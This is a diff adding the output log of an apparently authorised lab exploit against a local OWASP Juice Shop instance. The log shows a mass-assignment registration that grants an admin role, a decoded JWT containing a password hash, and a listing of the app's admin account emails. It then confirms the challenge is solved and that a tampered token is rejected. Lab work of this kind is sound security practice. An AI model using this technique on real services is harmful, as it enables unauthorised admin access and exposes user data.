@@ -1,0 +1,23 @@
+[*] target   : http://host.docker.internal:3000
+[*] identity : c7admin1792327001@juice.sh
+
+[1] Register with mass-assigned admin role
+    HTTP 201: {"status":"success","data":{"username":"","deluxeToken":"","lastLoginIp":"0.0.0.0","profileImage":"/assets/public/images/uploads/defaultAdmin.png","isActive":true,"id":25,"email":"c7admin1792327001@juice.sh","role":"admin","updatedAt":"2026-10-18T12:36:41.178Z","createdAt":"2026-10-18T12:36:41.178Z"
+
+[2] Log in as the newly registered account
+    HTTP 200
+    header : {"typ": "JWT", "alg": "RS256"}
+    payload: {"data": {"id": 25, "username": "", "email": "c7admin1792327001@juice.sh", "password": "754065f08bd54135289983f53769fe42", "role": "admin", "deluxeToken": "", "lastLoginIp": "0.0.0.0", "profileImage": "/assets/public/images/uploads/defaultAdmin.png", "totpSecret": "", "isActive": true, "createdAt": "2026-10-18 12:36:41.178 +00:00", "updatedAt": "2026-10-18 12:36:41.178 +00:00", "deletedAt": null}, "bid": 6, "iat": 1792327001}
+    -> role='admin' id=25
+
+[3] Prove the token acts as admin on a privileged endpoint
+    GET /api/Users -> HTTP 200, 24 users returned
+    admin accounts visible: ['admin@juice-sh.op', 'bjoern.kimminich@gmail.com', 'support@juice-sh.op', 'J12934@juice-sh.op', 'wurstbrot@juice-sh.op', 'bjoern@juice-sh.op', 'testing@juice-sh.op', 'cloud-admin@juice-sh.op', 'c7admin1792327001@juice.sh']
+
+[4] Challenge status: 'Admin Registration' solved?
+    HTTP 200 solved=True
+
+[5] Control: token with a tampered signature must be rejected
+    tampered-signature token -> HTTP 401
+
+[+] admin-session token saved to /workspace/evidence/c7_no_sqli_token.txt
